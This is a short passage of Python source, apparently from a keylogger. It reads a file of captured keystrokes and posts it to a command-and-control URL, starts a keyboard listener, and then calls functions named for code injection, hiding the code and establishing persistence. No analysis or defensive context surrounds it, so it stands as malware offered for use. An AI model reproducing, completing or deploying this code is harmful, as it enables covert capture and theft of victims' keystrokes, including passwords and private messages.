    def exfiltrate_logs():
        with open('keystrokes.log', 'r') as f:
            data = f.read()
        requests.post(c2_url, data=data)

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    inject_code()
    hide_code()
    establish_persistence()

